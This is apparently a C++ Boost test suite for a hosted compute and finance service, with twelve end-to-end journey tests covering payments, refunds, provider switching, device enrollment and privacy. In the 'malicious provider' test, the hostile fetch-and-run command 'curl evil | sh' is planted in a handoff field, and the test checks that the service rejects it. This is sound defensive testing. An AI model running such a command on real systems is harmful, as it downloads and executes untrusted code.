// Copyright (c) 2026 The BTX developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or https://opensource.org/license/mit/.
// J01 .. J12 unique native whole-system journeys.

#include <test/modelnet_hcp_test.h>
#include <test/util/setup_common.h>

#include <boost/test/unit_test.hpp>

BOOST_FIXTURE_TEST_SUITE(modelnet_hcp_journey_tests, BasicTestingSetup)

BOOST_AUTO_TEST_CASE(hcp_j01_free_hosted_discovery)
{
    auto e = hcp_test::Lab();
    BOOST_CHECK(e->Cfg().walletless);
    BOOST_CHECK(!e->Cfg().start_wallet);
    auto prof = e->Handle({.method = "GET", .path = "/profile"});
    BOOST_REQUIRE_EQUAL(prof.status, 200);
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    std::string code, err;
    auto acc = e->AcceptHandoff(env, code, err);
    BOOST_REQUIRE(code.empty());
    BOOST_CHECK(!acc["wallet_touched"].isTrue());
    UniValue out;
    BOOST_REQUIRE(e->EnsureLocal(hcp_test::kRecipe, out, code));
}

BOOST_AUTO_TEST_CASE(hcp_j02_locality_wins)
{
    auto e = hcp_test::Lab();
    e->PutResidentBase("base");
    e->PutLanSource("lan", 0);
    e->PutInternetSource("cex-hint", 8000);
    std::string code;
    auto plan = e->PlanLocal(hcp_test::kRecipe, code);
    BOOST_CHECK(!plan["inventory_reported"].isTrue());
    const std::string selected_source = plan["selected_source"].get_str();
    BOOST_CHECK_EQUAL(selected_source, "lan:lan");
    BOOST_CHECK(selected_source.find("lan:") == 0);
    BOOST_CHECK(selected_source != "internet:cex-hint");
}

BOOST_AUTO_TEST_CASE(hcp_j03_release_funding)
{
    auto e = hcp_test::Lab(true);
    const std::string tok = hcp_test::Token(*e, hcp_test::AllScopes());
    auto q = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/quotes", tok));
    BOOST_REQUIRE_EQUAL(q.status, 201);
    UniValue body(UniValue::VOBJ);
    body.pushKV("client_operation_id", "j03");
    auto created = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents", tok, &body));
    UniValue env;
    BOOST_REQUIRE(env.read(created.body));
    const std::string iid = env["body"]["intent_id"].get_str();
    e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents/" + iid + "/authorize", tok));
    auto sub = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents/" + iid + "/submit", tok));
    BOOST_CHECK_EQUAL(sub.status, 202);
    auto st = e->Handle(hcp_test::AuthReq(*e, "GET", "/finance/intents/" + iid, tok));
    BOOST_CHECK(st.body.find("runtime_ready") != std::string::npos);
}

BOOST_AUTO_TEST_CASE(hcp_j04_conversion_partial_success)
{
    auto e = hcp_test::Lab(true);
    const std::string tok = hcp_test::Token(*e, hcp_test::AllScopes());
    UniValue body(UniValue::VOBJ);
    body.pushKV("client_operation_id", "j04");
    auto created = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents", tok, &body));
    UniValue env;
    BOOST_REQUIRE(env.read(created.body));
    e->CompleteConversion(env["body"]["intent_id"].get_str());
    auto st = e->Handle(hcp_test::AuthReq(*e, "GET", "/finance/intents/" + env["body"]["intent_id"].get_str(), tok));
    BOOST_CHECK(st.body.find("conversion_complete") != std::string::npos);
}

BOOST_AUTO_TEST_CASE(hcp_j05_unknown_broadcast)
{
    auto e = hcp_test::Lab(true);
    const std::string tok = hcp_test::Token(*e, hcp_test::AllScopes());
    UniValue body(UniValue::VOBJ);
    body.pushKV("client_operation_id", "j05");
    auto created = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents", tok, &body));
    UniValue env;
    BOOST_REQUIRE(env.read(created.body));
    const std::string iid = env["body"]["intent_id"].get_str();
    e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents/" + iid + "/authorize", tok));
    e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents/" + iid + "/submit", tok));
    e->ForceBroadcastUnknown(iid);
    const std::string tx = e->LastSignedTxHex();
    e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents/" + iid + "/submit", tok));
    BOOST_CHECK_EQUAL(e->LastSignedTxHex(), tx);
}

BOOST_AUTO_TEST_CASE(hcp_j06_no_award_and_refund)
{
    auto e = hcp_test::Lab(true);
    e->SetRefundHeight(100);
    e->SetNativeHeight(50);
    BOOST_CHECK_LT(e->NativeHeight(), 100);
    e->SetNativeHeight(100);
    BOOST_CHECK_GE(e->NativeHeight(), 100);

    UniValue pol(UniValue::VOBJ);
    pol.pushKV("policy_id", "j06-life");
    pol.pushKV("lifetime_principal_atoms", "100000");
    pol.pushKV("refund_replenishes_lifetime", false);
    e->SetHostedPolicy(pol);

    const int64_t start_avail = e->AccountAvailable("account-demo");
    const std::string tok = hcp_test::Token(*e, hcp_test::AllScopes());
    UniValue body(UniValue::VOBJ);
    body.pushKV("client_operation_id", "j06-no-award-refund");
    body.pushKV("policy_id", "j06-life");
    auto created = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents", tok, &body));
    BOOST_REQUIRE_EQUAL(created.status, 201);
    UniValue env;
    BOOST_REQUIRE(env.read(created.body));
    const std::string iid = env["body"]["intent_id"].get_str();
    const int64_t after_create = e->AccountAvailable("account-demo");
    const int64_t spent_after_create = e->LifetimeSpent("j06-life");
    BOOST_CHECK_LT(after_create, start_avail);
    BOOST_CHECK_GT(spent_after_create, 0);

    auto cancel = e->Handle(hcp_test::AuthReq(*e, "POST", "/finance/intents/" + iid + "/cancel", tok));
    BOOST_CHECK(cancel.status == 200 || cancel.status == 202);
    const int64_t after_cancel = e->AccountAvailable("account-demo");
    BOOST_CHECK_EQUAL(after_cancel, start_avail);
    BOOST_CHECK_EQUAL(e->LifetimeSpent("j06-life"), spent_after_create);
    BOOST_CHECK_EQUAL(e->Cfg().automatic_spend_atoms, 0);
}

BOOST_AUTO_TEST_CASE(hcp_j07_subscription_under_concurrency)
{
    auto e = hcp_test::Lab(true);
    e->DeliverEventDuplicates("sub-event", 12);
    BOOST_CHECK(e->EventLogicalCount("sub-event") == 1);
}

BOOST_AUTO_TEST_CASE(hcp_j08_malicious_provider)
{
    auto e = hcp_test::Lab();
    auto env = hcp_test::MakeHandoff(*e, "device-demo", "demo-nonce-not-production", hcp_test::kCore, hcp_test::kRecipe);
    env.body.pushKV("shell", "curl evil | sh");
    std::string err, code;
    e->SignAsProvider(env, err);
    e->AcceptHandoff(env, code, err);
    BOOST_CHECK_EQUAL(code, "FORBIDDEN_FIELD");
}

BOOST_AUTO_TEST_CASE(hcp_j09_provider_exit)
{
    auto e = hcp_test::Lab();
    e->SetPendingUnknownOn("provider-demo", "intent-a");
    auto sw = e->SwitchProvider("provider-b");
    BOOST_CHECK(!sw["finance_replayed"].isTrue());
}

BOOST_AUTO_TEST_CASE(hcp_j10_custody_failure_drill)
{
    auto e = hcp_test::Lab(true);
    BOOST_REQUIRE(e->Persist());
    BOOST_REQUIRE(e->Restore());
    auto exp = e->ExportPublic(false);
    BOOST_CHECK(!exp["self_custody"].isTrue());
}

BOOST_AUTO_TEST_CASE(hcp_j11_fleet_browser_journey)
{
    auto e = hcp_test::Lab();
    const std::string tok = hcp_test::Token(*e, hcp_test::AllScopes());
    UniValue body(UniValue::VOBJ);
    body.pushKV("device_id", "device-j11");
    auto en = e->Handle(hcp_test::AuthReq(*e, "POST", "/devices/enroll", tok, &body));
    UniValue d;
    BOOST_REQUIRE(d.read(en.body));
    UniValue conf(UniValue::VOBJ);
    conf.pushKV("challenge", d["challenge"].get_str());
    BOOST_REQUIRE_EQUAL(e->Handle(hcp_test::AuthReq(*e, "POST", "/devices/device-j11/confirm", tok, &conf)).status, 200);
    e->Handle(hcp_test::AuthReq(*e, "POST", "/devices/device-j11/revoke", tok));
}

BOOST_AUTO_TEST_CASE(hcp_j12_privacy_and_service_independence)
{
    auto e = hcp_test::Lab();
    e->SetPrivatePrompt("PROMPT");
    e->DisconnectProvider();
    UniValue out;
    std::string code;
    BOOST_CHECK(e->EnsureLocal(hcp_test::kRecipe, out, code));
    BOOST_CHECK(e->ExportPublic(false).write().find("PROMPT") == std::string::npos);
}

BOOST_AUTO_TEST_SUITE_END()
